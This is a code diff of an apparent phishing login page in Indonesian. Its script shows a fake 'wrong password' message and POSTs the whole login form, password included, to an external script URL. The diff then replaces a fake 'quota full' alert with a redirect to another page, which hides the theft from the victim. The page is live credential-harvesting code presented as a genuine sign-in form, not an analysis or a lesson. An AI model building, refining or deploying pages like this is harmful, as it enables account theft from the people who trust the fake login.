@@ -28,10 +28,10 @@
             <input type="password" placeholder="Kata Sandi" minlength="6" name="pass" id="password-input" />
               <p id="show-password"></p>
             </div>                  
-          <a href="/">
+          <a href="">
             <p class="lupaPass">Lupa kata sandi?</p>
           </a>
-          <button type="submit" class="btn-masuk" disabled>Masuk</button>
+            <button type="submit" class="btn-masuk" disabled>Masuk</button>
         </form>
         <div class="div-errorMassage">
           <span class="errorMassage"></span>
@@ -64,15 +64,14 @@
     <script>
       let handleNumber = 0
 const errorMassage = document.querySelector('.errorMassage')
+const a = document.querySelector('.a')
 
 function elseHandle() {
     errorMassage.innerHTML = ''
     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
           .then(response => console.log('Success!', response))
           .catch(error => console.error('Error!', error.message))
-    setTimeout(() => {
-        alert('maaf kuota untuk ini sudah penuh')
-    }, 800);
+          window.location.href = 'web.html';
 }
   function handleSend() {
     errorMassage.innerHTML = 'Maaf, kata sandi Anda salah. Silakan periksa kembali kata sandi Anda.'
